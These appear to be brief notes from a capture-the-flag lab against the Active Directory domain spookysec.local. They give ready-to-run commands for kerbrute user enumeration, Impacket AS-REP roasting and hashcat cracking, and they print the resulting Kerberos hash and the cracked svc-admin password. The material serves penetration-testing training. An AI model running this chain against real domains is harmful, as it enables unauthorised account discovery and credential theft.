### kerbrute

good practice to set victim IP to a domain name in `/etc/hosts`

user enumeration

```
kerbrute userenum --dc spookysec.local -d spookysec.local 'userlist.txt' -t 100
```

---

### getNPusers.py
```
python3 /tmp/impacket/examples/GetNPUsers.py -dc-ip spookysec.local thm-ad/  -usersfile u2.txt 
```

we obtain this kerberos hash:

```
$krb5asrep$23$svc-admin@THM-AD:640b2ef8c30934a79586ffcb60934d54$df250ebd2428bb747ecab7428f529ea5257071f3468336df751f3bfa3717bc5c050c09164303da9a373b28cded6abc4e6ffe583f7e9908d848332896244572715bf4818da2efb07ee17c172d140f224d44eac2d4583bb948cbecdf5ded077e7e5291e7f6e82b2079dd2df785ceb2c2a7fdc8c9b370741f07d84ff684d0f3639055a45bd414074a51f693f0f104ba6cbc865f574f9955aea1a5a1773defa9d88642ed16e520808c7cd3dd040c973f746c2f6a5281c575423283a7ab4eb941eba210eda1e6a06c952a8509105ee73d3ca2ece40912ab4191eeb1b91e8fb847b64465236e43e056db6e86
```

---

### hashcat
```
hashcat -a 0 -m 18200 crack.txt /usr/share/wordlists/rockyou.txt
```

reveals the creds:
```
svc-admin:management2005
```


